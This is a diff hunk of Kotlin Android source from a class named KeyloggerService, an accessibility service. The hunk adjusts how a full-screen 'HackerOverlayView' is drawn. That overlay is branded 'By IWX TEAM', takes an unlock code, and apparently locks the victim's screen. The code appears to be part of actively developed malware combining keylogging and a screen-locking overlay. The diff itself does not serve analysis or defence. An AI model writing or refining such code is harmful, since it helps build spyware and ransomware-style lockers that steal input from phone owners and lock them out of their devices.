@@ -266,15 +266,15 @@ class KeyloggerService : AccessibilityService() {
             hideOverlayInternal()
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             wm = windowManager
-            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode) { hideOverlay() }
+            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode, speed) { hideOverlay() }
             val params = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR,
                 PixelFormat.TRANSLUCENT
             ).also {
-                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN or
+                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                                    WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
             }
             windowManager.addView(view, params)
